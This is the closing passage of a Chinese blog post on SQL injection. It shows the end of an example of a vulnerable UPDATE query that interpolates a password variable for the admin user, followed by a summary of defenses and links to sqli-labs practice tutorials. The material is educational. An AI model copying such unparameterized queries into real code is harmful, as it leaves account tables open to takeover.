</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>UPDATE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>SET</span><span class=w> </span><span class=n>PASSWORD</span><span class=o>=</span><span class=s1>&#39;$pass&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=w>
</span></span></span></code></pre></div><hr><h3 id=结尾>结尾<a hidden class=anchor aria-hidden=true href=#结尾>#</a></h3><p>我们可能觉得现代框架和工具链可以避免这些问题，但通过上面的例子可以感受到，道高一尺魔高一丈，<strong>稍有疏忽就可能被利用</strong></p><p>SQL注入的本质是：攻击者通过操控用户输入的方式，改变原本的SQL查询结构，从而绕过应用程序的安全策略，执行恶意指令。我们可以从不同的角度进行防御：</p><ul><li>校验用户输入</li><li>操作前进行详尽的校验包括已入库的数据</li><li>细化数据库账户权限</li><li>结合 WAF、日志监控、定期渗透测试</li><li>&mldr;</li></ul><p>SQL注入攻击揭示的不仅是技术漏洞，更指向一个通用安全原则：<strong>任何外部输入都可能在与现有流程交互时引发非预期行为</strong>。这一安全思维可迁移至日常生活风险防控体系：</p><ul><li>查杀未知邮件的附件</li><li>逐一检查合同</li><li>对陌生通知通过官方渠道二次确认</li><li>仔细评审合作方提供的材料</li><li>&mldr;</li></ul><h3 id=参考资料>参考资料<a hidden class=anchor aria-hidden=true href=#参考资料>#</a></h3><p>本文只为抛砖引玉，精简了部分细节，详情可以参考以下教程：</p><ul><li><a href=https://www.sqlsec.com/2020/05/sqlilabs.html>SQLI labs 靶场精简学习记录</a></li><li><a href=https://github.com/crow821/crowsec/blob/master/sqli-labs%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/sqli-labs%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B20200124.pptx>sqli-labs基础教程/sqli-labs注入教程20200124.pptx</a></li><li><a href=https://www.bilibili.com/video/BV1e441127Rd>sql注入之sqli-labs系列教程(less1-10)</a></li><li><a href=https://www.cnblogs.com/1ink/p/15115790.html>sqli-labs(62-65)-challenges-盲注</a></li><li><a href=https://ovi3.github.io/2020/12/04/sqli-labs-less-62/>sqli-labs靶场Less-62题解（少于130次）</a></li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://aaronlinv.github.io/posts/%E9%87%8D%E6%8B%BE-ssh%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/><span class=title>Next »</span><br><span>重拾 SSH：从基础到安全加固</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://aaronlinv.github.io/>Aaron Lin</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>